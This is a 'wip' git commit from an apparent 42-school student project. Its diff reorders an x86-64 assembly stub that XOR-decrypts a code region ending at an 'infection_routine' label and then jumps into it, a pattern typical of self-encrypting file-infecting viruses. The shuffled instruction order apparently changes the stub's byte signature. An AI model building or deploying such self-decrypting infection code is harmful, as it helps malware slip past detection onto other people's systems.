fedf1ef5dcd7d735f73814d6bf7caaa14d46c439
Jeremy Maia <jmaia@student.42.fr>
2025-03-23 16:12:07 +0100

    wip

--- srcs/main.s
+++ srcs/main.s
@@ -21,12 +21,12 @@ begin:
 	push r11
 
 	; uncipher first part of the code
-	lea rdi, [rel program_entry]			; data = &program_entry
-	mov rsi, infection_routine - program_entry	; size = infection_routine - program_entry
-	lea rdx, [rel key]				; key = key
 	mov rcx, [rel key_size]				; key_size = key_size
+	lea rdi, [rel program_entry]			; data = &program_entry
 	cmp rcx, 0					; if (key_size == 0)
+	mov rsi, infection_routine - program_entry	; size = infection_routine - program_entry
 	je program_entry				; 	goto program_entry
+	lea rdx, [rel key]				; key = key
 	call xor_cipher					; xor_cipher(data, size, key, key_size)
 
 	jmp program_entry				; goto program_entry
